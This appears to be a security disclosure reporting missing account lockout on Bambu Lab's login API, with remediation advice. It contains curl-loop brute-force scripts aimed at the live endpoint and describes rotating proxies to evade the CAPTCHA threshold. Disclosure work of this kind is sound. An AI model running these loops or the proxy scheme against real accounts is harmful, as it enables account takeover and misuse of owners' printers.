# Missing Account Lockout and Weak Rate Limiting on Login API — Credential Brute Force Possible

## Summary

The Bambu Lab login API at `https://api.bambulab.com/v1/user-service/user/login` has insufficient brute-force protection. While a CAPTCHA challenge is triggered after approximately 9 failed attempts from the same IP, there is no account lockout mechanism. An attacker can:

1. Make 9 login attempts per IP address before CAPTCHA triggers
2. Rotate IPs (proxies/VPN) to reset the CAPTCHA threshold
3. Continue brute-forcing indefinitely — the target account is never locked

The account remains accessible and never triggers a lockout or notification to the account owner.

## Severity

**Medium-High** — Enables credential stuffing and brute-force attacks against user accounts.

## Affected Endpoint

- **URL:** `https://api.bambulab.com/v1/user-service/user/login`
- **Method:** POST
- **Content-Type:** application/json

## Steps to Reproduce

### 1. Confirm no account lockout

Send 50+ failed login attempts to the same account:

```bash
for i in $(seq 1 50); do
  curl -s "https://api.bambulab.com/v1/user-service/user/login" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"account\":\"target@example.com\",\"password\":\"attempt$i\"}"
done
```

**Result:** After 9 attempts, a CAPTCHA is requested. But the account is never locked. With a new IP, you get 9 fresh attempts.

### 2. Demonstrate IP-based rate limit (not account-based)

From IP #1: 9 attempts → CAPTCHA triggered
From IP #2: 9 fresh attempts → CAPTCHA triggered
From IP #3: 9 fresh attempts → CAPTCHA triggered

With 100 rotating proxies: **900 password attempts** against a single account with no lockout or user notification.

### 3. Response analysis

**Normal failed login (attempts 1-9):**
```json
{"code": 1, "error": "Incorrect account or password."}
```
HTTP Status: 400

**After rate limit (attempt 10+):**
```json
{"captchaId": "3827e21c51c685cda73153fbc7c6061d", "captchaScene": "verify_code", "error": "We need to confirm that you are not a robot."}
```
HTTP Status: 418

**Note:** The error message is identical for invalid accounts and wrong passwords — no username enumeration. However, the lack of lockout is the primary issue.

## Impact

1. **Credential Stuffing:** Attackers with leaked credential databases can test username/password combinations at scale using rotating proxies. With 1000 proxies, an attacker gets 9000 attempts before needing to solve any CAPTCHAs.

2. **Targeted Brute Force:** For a targeted attack on a known Bambu Lab account (e.g., enterprise account controlling expensive printers), an attacker can try common passwords across rotating IPs indefinitely.

3. **No User Awareness:** The account owner receives no notification of failed login attempts, leaving them unaware of an ongoing attack.

4. **Device Impact:** Bambu Lab accounts control 3D printers worth $500-$2000+. Account compromise could lead to:
   - Unauthorized remote printing
   - Theft of proprietary 3D models/designs
   - Physical safety risks (starting prints unattended)
   - Firmware modification

## Proof of Concept

```bash
#!/bin/bash
# PoC: Demonstrates 9 attempts succeed before CAPTCHA, account never locks
TARGET="victim@example.com"

for i in $(seq 1 15); do
  RESP=$(curl -s "https://api.bambulab.com/v1/user-service/user/login" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"account\":\"$TARGET\",\"password\":\"password$i\"}" \
    -w " | HTTP %{http_code}")
  echo "Attempt $i: $RESP"
done
# Observe: attempts 1-9 get "Incorrect password", 10+ get CAPTCHA
# But account is NEVER locked
```

## Recommendation

1. **Implement account lockout** after 10-15 failed attempts (temporary lockout, 15-30 minutes)
2. **Notify the user** via email when multiple failed login attempts are detected
3. **Implement exponential backoff** per account, not just per IP
4. **Add MFA support** for accounts controlling expensive hardware
5. **Consider device fingerprinting** in addition to IP-based rate limiting

## References

- OWASP Testing Guide: Brute Force Attack (OTG-AUTHN-003)
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- NIST SP 800-63B: Digital Identity Guidelines — Authentication and Lifecycle Management
